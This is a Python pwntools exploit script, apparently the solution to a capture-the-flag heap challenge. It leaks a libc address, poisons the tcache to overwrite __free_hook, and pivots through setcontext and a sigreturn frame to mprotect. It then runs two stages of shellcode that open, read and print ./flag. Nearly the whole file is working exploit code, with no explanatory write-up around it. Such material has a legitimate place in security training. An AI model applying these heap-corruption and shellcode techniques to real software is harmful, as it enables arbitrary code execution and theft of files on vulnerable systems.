from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter(b"choice:", b"1")
    p.sendafter(b"index:", str(index).encode("ascii"))
    p.sendafter(b"size:", str(size).encode("ascii"))


def delete_chunk(index):
    p.sendafter(b"choice:", b"2")
    p.sendafter(b"index:", str(index).encode("ascii"))


def edit_chunk(index, content):
    p.sendafter(b"choice:", b"3")
    p.sendafter(b"index:", str(index).encode("ascii"))
    p.sendafter(b"length:", str(len(content)).encode("ascii"))
    p.sendafter(b"content:", content)


def show_chunk(index):
    p.sendafter(b"choice:", b"4")
    p.sendafter(b"index:", str(index).encode("ascii"))

gdb.attach(p)

# leaking libc address
add_chunk(0, 0x500)
add_chunk(1, 0x10)
delete_chunk(0)
show_chunk(0)

libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - 0x3afca0
print("libc.address:", hex(libc.address))

# tcache poisoning
add_chunk(0, 0x400)
delete_chunk(0)
edit_chunk(0, p64(libc.sym['__free_hook']))

add_chunk(1, 0x400)
# malloc to __free_hook
add_chunk(0, 0x400)

# shellcode: read bytes from stdin and exec it
shellcode = """
            xor rdi, rdi
            mov rsi, %d
            mov edx, 0x1000
            mov eax, 0
            syscall
            jmp rsi
            """ % (libc.sym["__free_hook"] & 0xfffffffffffff000)
edit_chunk(0, p64(libc.sym["setcontext"] + 53) + p64(libc.sym["__free_hook"] + 0x10) + asm(shellcode))

frame = SigreturnFrame()
frame.rsp = libc.sym["__free_hook"] + 0x8
frame.rip = libc.sym["mprotect"]
# frame.rip = libc.sym["system"]
frame.rdi = libc.sym["__free_hook"] & 0xfffffffffffff000
# frame.rdi = libc.address + 0x174700 # /bin/sh
frame.rsi = 0x2000
frame.rdx = 7
edit_chunk(1, bytes(frame))
# ((void(*)(void*))__free_hook)(chunk1)
# setcontext --> mprotect --> sc1 --> sc2
delete_chunk(1)

shellcode2 = '''
                mov rax, 0x67616c662f2e ;// ./flag
                push rax
                mov rdi, rsp ;// /flag
                mov rsi, 0 ;// O_RDONLY
                xor rdx, rdx ;
                mov rax, 2 ;// SYS_open
                syscall
                mov rdi, rax ;// fd
                mov rsi,rsp ;
                mov rdx, 1024 ;// nbytes
                mov rax,0 ;// SYS_read
                syscall
                mov rdi, 1 ;// fd
                mov rsi, rsp ;// buf
                mov rdx, rax ;// count
                mov rax, 1 ;// SYS_write
                syscall
                mov rdi, 123 ;// error_code
                mov rax, 60
                syscall
            '''

# send sc2 to stdin, cat ./flag
p.send(asm(shellcode2))

p.interactive()
